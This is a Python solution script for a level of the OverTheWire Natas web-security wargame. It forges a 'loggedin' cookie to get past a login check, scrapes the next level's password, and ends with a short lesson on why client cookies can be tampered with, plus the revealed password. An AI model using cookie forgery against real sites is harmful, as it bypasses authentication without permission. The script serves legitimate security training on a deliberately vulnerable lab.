from bs4 import BeautifulSoup
import requests
import re

lvl = '5'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()

url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)

my_cookies = {'loggedin':'1'}
soup = BeautifulSoup(requests.get(url=url,auth=lvl_pass, cookies=my_cookies).text, 'html.parser')

pw=re.search(r"[a-zA-Z0-9]{32}",soup.find("div",id="content").text)[0]
open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)



'''
Lesson: Cookies are recieved from the end-client and can be easily modified by the client.
Either encrypt them well so that meaningful changes cannot be made, or do not rely on them
for important actions.

Username: natas6
Password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

'''
